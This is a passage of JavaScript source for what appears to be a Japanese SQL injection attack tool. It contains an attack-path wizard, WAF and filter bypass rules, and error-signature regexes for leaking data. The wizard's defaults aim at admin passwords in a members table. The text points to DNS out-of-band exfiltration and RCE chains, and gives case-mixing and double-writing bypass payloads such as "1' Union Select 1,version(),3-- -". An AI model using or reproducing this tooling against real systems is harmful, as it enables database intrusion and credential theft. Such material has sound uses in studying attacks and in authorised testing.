      +"<tr><td>ユーザー/ハッシュ/権限 (--users/--passwords/--privileges)</td><td>○</td><td>○ UNION⑨</td></tr>"
      +"<tr><td>ファイル読み取り (--file-read)</td><td>○</td><td>○ RCE/OOB タブ</td></tr>"
      +"<tr><td>ファイル書込・OSシェル (--os-shell)</td><td>○</td><td>○ RCE/OOB タブ (チェーン生成)</td></tr>"
      +"<tr><td>二次注入 (--second-url)</td><td>○</td><td>○ ブラインド生成器の「判定用URL」</td></tr>"
      +"<tr><td>コンパレータ (内容/長さ/時間)</td><td>bbqsql ○</td><td>○ 判定4種</td></tr>"
      +"<tr><td>並列抽出</td><td>bbqsql (gevent)</td><td>○ ThreadPool</td></tr>"
      +"<tr><td>WAF検出→tamper推薦</td><td>ATLAS</td><td>○ tamper自動生成 + フィルタ逆探査</td></tr>"
      +"<tr><td>クエリテンプレート (任意位置)</td><td>bbqsql ○</td><td>△ 生成スクリプトの LEN_PAYLOAD/CHR_PAYLOAD を直接編集 (等価)</td></tr>"
      +"<tr><td>クロール/フォーム解析/プロキシ/Tor</td><td>○</td><td>× (スコープ外。 Burp + 本ツール併用を推奨)</td></tr></table>"
  }
);

const WIZARD = {
  q_detect: {
    q: "パラメータに ' を入れると反応がある? (SQLエラー / 画面差分 / 500)",
    opts: [
      { t: "Yes — 反応あり", next: "q_echo", tag: "注入あり" },
      { t: "No — 反応なし", next: "end_detect", tag: "未検出" }
    ]
  },
  q_echo: {
    q: "DBの値が画面に表示される? (検索結果・会員情報など = エコー列あり)",
    opts: [
      { t: "Yes — 表示される", next: "q_union", tag: "エコーあり" },
      { t: "No — 表示されない", next: "q_error", tag: "エコー無し" }
    ]
  },
  q_union: {
    q: "UNION SELECT が通る? (ORDER BY 1,2,... でカラム数が取れる)",
    opts: [
      { t: "Yes — 通る", next: "f_union", tag: "UNION可" },
      { t: "No — 通らない", next: "q_union_block", tag: "UNION不可" }
    ]
  },
  q_union_block: {
    q: "union / select が拒否・削除されていそう? (エラー文言や挙動から)",
    opts: [
      { t: "Yes — フィルタされてる", next: "end_bypass", tag: "キーワード拒否" },
      { t: "No / わからない", next: "q_error", tag: "別路線へ" }
    ]
  },
  q_error: {
    q: "詳細なエラーメッセージが出る? (XPATH error 等に値を載せられそう)",
    opts: [
      { t: "Yes — 出る", next: "f_error", tag: "エラー表示あり" },
      { t: "No — 出ない", next: "q_bool", tag: "エラー無し" }
    ]
  },
  q_bool: {
    q: "真偽で差分が出る? (AND 1=1 と AND 1=2 で内容/ステータスが変わる)",
    opts: [
      { t: "Yes — 差分あり", next: "f_bool", tag: "ブール差分あり" },
      { t: "No — 変わらない", next: "q_time", tag: "差分無し" }
    ]
  },
  q_time: {
    q: "応答時間を操作できる? (SLEEP を入れると遅延する)",
    opts: [
      { t: "Yes — 遅延する", next: "f_time", tag: "時間操作可" },
      { t: "No — しない", next: "end_dead", tag: "完全ブラインド" }
    ]
  },
  f_union: {
    form: "UNION路線 — 確認した値を入れるとビルダーへ転記",
    fields: [
      { id: "wz-cols", label: "カラム数", type: "num", val: "4" },
      { id: "wz-echo", label: "表示列位置", type: "num", val: "2" }
    ],
    cta: { t: "UNIONビルダーへ転記", act: "union" },
    note: "ORDER BY 総当たりでエラー直前の数、表示列は zzN が画面に出る位置。"
  },
  f_error: {
    form: "エラーベース路線",
    fields: [],
    cta: { t: "エラーベースタブへ", act: "error" },
    note: "DBMS別に XPATH / CAST / CONVERT 系を順に撃つ。32文字制限は substr 分割。"
  },
  f_bool: {
    form: "ブール盲注路線 — 抜きたい情報を入力",
    fields: [
      { id: "wz-col", label: "カラム名 (必須)", type: "text", val: "pw" },
      { id: "wz-table", label: "テーブル名 (必須)", type: "text", val: "members" },
      { id: "wz-where", label: "行の条件", type: "text", val: "id='admin'" },
      { id: "wz-judge", label: "判定方法", type: "select", val: "in", opts: [["in","文字列が含まれる"],["out","文字列が消える"],["len","応答長が増える"]] }
    ],
    cta: { t: "盲注スクリプト生成へ転記", act: "blind" },
    note: "カラム名が分からない → UNION⑨ 横断カラム検索 (pass/flag等) か辞書総当たり。"
  },
  f_time: {
    form: "時間盲注路線 — 遅延をオラクルにする",
    fields: [
      { id: "wz-col", label: "カラム名 (必須)", type: "text", val: "pw" },
      { id: "wz-table", label: "テーブル名 (必須)", type: "text", val: "members" },
      { id: "wz-where", label: "行の条件", type: "text", val: "id='admin'" },
      { id: "wz-delay", label: "遅延秒", type: "num", val: "3" }
    ],
    cta: { t: "時間盲注スクリプト生成へ転記", act: "timeblind" },
    note: "SLEEP が拒否される → benchmark / 重いクエリ (ブラインド タブの代替カード)。"
  },
  end_detect: {
    end: "検出からやり直し",
    tech: "偵察不足",
    notes: [
      "検出タブのプローブ一式 (真偽/時間/エラー差分) を順に撃つ",
      "パラメータ以外も狙う: XFF / User-Agent / Referer / Cookie / JSONボディ",
      "数値型パラメータはクォート無しで試す"
    ],
    links: [
      { t: "検出タブへ", act: "detect" },
      { t: "チートシート (ヘッダ注入)", act: "cheat" }
    ]
  },
  end_bypass: {
    end: "サニタイズ解除が先",
    tech: "バイパス → UNION",
    notes: [
      "str_replace型 → 二重書き (selselectect)、preg型 → コメント分割 (un/**/ion)",
      "ソースが貰えるなら貼って自動解析、無いなら逆探査プローブ19種"
    ],
    links: [
      { t: "バイパス設定へ (union+select をセット)", act: "bypassUS" },
      { t: "フィルタ逆探査", act: "bypass" }
    ]
  },
  end_dead: {
    end: "完全ブラインド",
    tech: "OOB / 二次 / スタックド",
    notes: [
      "外部通信可 → DNS帯域外で一気に流出 (dnslog/canarytokens)",
      "PG / MSSQL でスタック可 → RCEチェーンまで直結",
      "入力が別画面で表示される → 二次注入"
    ],
    links: [
      { t: "RCE / OOB タブへ", act: "rce" },
      { t: "チートシートへ", act: "cheat" }
    ]
  }
};

FILTERS.push(
  { id: "casecap", label: "UNION/union 一致拒否", desc: "大文字・小文字の完全一致でブラックリック検査 (区別一致 / strposやi無しpreg) → Union の先頭大文字/混合で回避" }
);

PRESETS.push(
  { label: "UNION/union一致拒否 → Union", ids: ["casecap"] }
);

CHEATS.push(
  {
    t: "区別一致ブラックリスト (UNION と union は消えるが Union は通る)",
    k: "union Union 先頭大文字 区別一致 strpos preg i無し casecap 交互",
    d: "<ul><li>PHPの <code>strpos($q,'UNION')!==false || strpos($q,'union')!==false</code> や <b>i フラグ無し</b>の <code>preg_match('/union|select/')</code> は「その綴りそのもの」しか殺せない</li><li>→ <code>Union Select</code> (先頭大文字) や <code>UnIoN sElEcT</code> (交互) がそのまま通る (SQLは大文字小文字不区別なので動作も同じ)</li><li>バイパス設定の <code>UNION/union 一致拒否</code> チップで全ペイロードを先頭大文字化できる (引用符内と 0x 接頭辞は保持)</li><li>対して i フラグ付き/strtolower検査なら混合ケースは全滅 → コメント分割か二重書きへ</li></ul>",
    p: [
      "1' Union Select 1,version(),3-- -",
      "1' UnIoN sElEcT 1,version(),3-- -"
    ]
  }
);

const BAN_TO_CHIP = [
  { t: "--", chips: ["dash"] },
  { t: "#", chips: ["hash"] },
  { t: "/*", chips: ["inline", "comment"] },
  { t: "*/", chips: ["inline"] },
  { t: "/**/", chips: ["inline"] },
  { t: "'", chips: ["quote"] },
  { t: '"', chips: ["quote"] },
  { t: " ", chips: ["space"] },
  { t: "%20", chips: ["space"] },
  { t: ",", chips: ["comma"] },
  { t: "=", chips: ["eq"] },
  { t: "and", chips: ["andor"] },
  { t: "or", chips: ["andor"] },
  { t: "&&", chips: ["andor"] },
  { t: "||", chips: ["andor"] },
  { t: "union", chips: ["union"] },
  { t: "select", chips: ["select"] },
  { t: "(", chips: ["paren"] },
  { t: ")", chips: ["paren"] },
  { t: "sleep", chips: ["sleep"] },
  { t: "substr", chips: ["substr"] },
  { t: "substring", chips: ["substr"] },
  { t: "mid", chips: ["substr"] },
  { t: "ascii", chips: ["ascii"] },
  { t: "ord", chips: ["ascii"] },
  { t: "if", chips: ["if"] },
  { t: "information_schema", chips: ["infoschema"] },
  { t: "0x", chips: [] },
  { t: "0-9", chips: ["number"] },
  { t: "[0-9]", chips: ["number"] },
  { t: "A-Z", chips: ["upper"] },
  { t: "a-z", chips: ["lower"] }
];

CHEATS.push(
  {
    t: "カスタム禁止文字列入力 (バイパス設定②)",
    k: "custom ban 禁止文字 自由入力 %0b %0d 代替 選択",
    d: "<ul><li>禁止トークンを1行1個 (カンマ区切り可) で入力すると: <b>既知トークン</b> (-- # /* ' \" 空白 , = ( union select sleep substr ascii if information_schema 0x 数字 …) は対応チップを自動ON</li><li><b>空白代替系</b> (%09 %0a %0b %0c %0d %a0 /**/) は「禁止されていないもの」を自動選択 (全部禁止なら括弧グルーピングへの警告)</li><li><b>未知のキーワード</b> (from where concat など) は最終パスで二重書き (str_replace型) またはコメント分割 (preg型) を自動適用</li><li>変換しきれないものは「残存」警告で明示 (引用符内リテラルなど、値そのものは書き換え不能)</li></ul>"
  }
);

FILTERS.splice(3, 0,
  { id: "dash", label: "-- のみ禁止", desc: "-- は拒否/削除されるが # は使える → 自動で # に切替" },
  { id: "hash", label: "# のみ禁止", desc: "# は拒否/削除されるが -- は使える → 自動で -- - に切替" }
);

const ERR_DB_SIGS = [
  { re: "you have an error in your SQL syntax|check the manual that corresponds to your (?:MySQL|MariaDB) server version|Warning\\s*:\\s*mysql_|mysqli?_[a-z_]+\\(|MySQL server|\\d+\\.\\d+(?:\\.\\d+)?[- ](?:MariaDB|MySQL)", db: "mysql", label: "MySQL / MariaDB" },
  { re: "invalid input syntax for|psycopg2|PostgreSQL|Npgsql|pg_attrdef", db: "postgres", label: "PostgreSQL" },
  { re: "Conversion failed when converting|Unclosed quotation mark after|Incorrect syntax near|Microsoft SQL Server|ODBC SQL Server Driver|SQL Server Native Client|pyodbc|SqlClient", db: "mssql", label: "MSSQL (SQL Server)" },
  { re: "ORA-\\d+|Oracle Database|TNS:|SP2-\\d+", db: "oracle", label: "Oracle" },
  { re: "SQLITE_[A-Z_]+|SQLite3?::|sqlite3?\\.(?:OperationalError|ProgrammingError|DatabaseError)|unrecognized token|SQL error or missing database|SQLite", db: "sqlite", label: "SQLite" }
];

const ERR_LEAK_SIGS = [
  { re: "Duplicate entry '([^']+)'", db: "mysql", how: "FLOOR/GROUP BY error-based (MySQL) — 既に値がリークしている状態" },
  { re: "XPATH syntax error: '([^']+)'", db: "mysql", how: "EXTRACTVALUE/UPDATEXML error-based (MySQL / 32文字制限)" },
  { re: "Duplicate column name '([^']+)'", db: "mysql", how: "JOIN 自己結合によるカラム名リーク (MySQL)" },
  { re: "invalid input syntax for (?:type )?\\w+: ?\"([^\"]+)\"", db: "postgres", how: "CAST error-based (PostgreSQL)" },
  { re: "Conversion failed when converting the \\w+ value '([^']+)'", db: "mssql", how: "CONVERT/CAST error-based (MSSQL)" }
];

const ERR_VERSION_SIGS = {
  mysql: ["(\\d+\\.\\d+(?:\\.\\d+)?)[- ](?:MariaDB|MySQL)", "(?:MySQL|MariaDB)[ versions]{0,14}(\\d+\\.\\d+(?:\\.\\d+)?)"],
  postgres: ["PostgreSQL (\\d+\\.\\d+)"],
  mssql: ["SQL Server[^\\d]{0,40}(\\d{2}\\.\\d+(?:\\.\\d+)?)"],
  oracle: ["Release (\\d+(?:\\.\\d+){2,4})", "Oracle Database (\\d+[a-z]?)"],
  sqlite: ["SQLite version? (\\d+\\.\\d+\\.\\d+)"]
};
